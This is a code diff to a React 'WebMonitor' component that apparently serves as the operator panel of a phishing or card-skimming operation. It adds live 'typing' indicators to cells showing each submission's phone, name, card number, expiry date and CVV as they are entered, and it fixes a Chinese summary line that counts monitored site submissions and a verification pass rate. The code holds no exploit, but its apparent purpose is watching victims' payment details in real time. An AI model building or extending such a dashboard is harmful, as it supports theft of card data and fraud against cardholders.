@@ -299,24 +299,59 @@ export function WebMonitor() {
                   )}
                 </div>
 
-                <div className="text-sm font-mono border border-gray-300 rounded px-2 py-1 min-w-[100px] bg-gray-50">
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-300 ${
+                  isFieldTyping(submission.id, 'phone')
+                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    : 'border-gray-300 bg-gray-50'
+                }`}>
                   {submission.realtimeInput?.phone || 'N/A'}
+                  {isFieldTyping(submission.id, 'phone') && (
+                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
+                  )}
                 </div>
 
-                <div className="text-sm font-medium border border-gray-300 rounded px-2 py-1 min-w-[80px] bg-gray-50">
+                <div className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-300 ${
+                  isFieldTyping(submission.id, 'name')
+                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    : 'border-gray-300 bg-gray-50'
+                }`}>
                   {submission.userName}
+                  {isFieldTyping(submission.id, 'name') && (
+                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
+                  )}
                 </div>
 
-                <div className="text-sm font-mono border border-gray-300 rounded px-2 py-1 min-w-[140px] bg-gray-50">
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-300 ${
+                  isFieldTyping(submission.id, 'cardNumber')
+                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    : 'border-gray-300 bg-gray-50'
+                }`}>
                   {submission.realtimeInput?.cardNumber || 'N/A'}
+                  {isFieldTyping(submission.id, 'cardNumber') && (
+                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
+                  )}
                 </div>
 
-                <div className="text-sm font-mono border border-gray-300 rounded px-2 py-1 min-w-[60px] bg-gray-50">
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-300 ${
+                  isFieldTyping(submission.id, 'expiryDate')
+                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    : 'border-gray-300 bg-gray-50'
+                }`}>
                   {submission.realtimeInput?.expiryDate || 'N/A'}
+                  {isFieldTyping(submission.id, 'expiryDate') && (
+                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
+                  )}
                 </div>
 
-                <div className="text-sm font-mono border border-gray-300 rounded px-2 py-1 min-w-[50px] bg-gray-50">
+                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-300 ${
+                  isFieldTyping(submission.id, 'cvv')
+                    ? 'border-blue-400 bg-blue-50 shadow-sm animate-pulse'
+                    : 'border-gray-300 bg-gray-50'
+                }`}>
                   {submission.realtimeInput?.cvv || 'N/A'}
+                  {isFieldTyping(submission.id, 'cvv') && (
+                    <span className="inline-block w-0.5 h-4 bg-blue-500 ml-1 animate-pulse"></span>
+                  )}
                 </div>
               </div>
 
@@ -366,7 +401,7 @@ export function WebMonitor() {
         {/* Bottom Summary */}
         <div className="mt-6 pt-4 border-t border-border">
           <div className="text-xs text-muted-foreground">
-            共监�� {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
+            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
           </div>
         </div>
       </div>
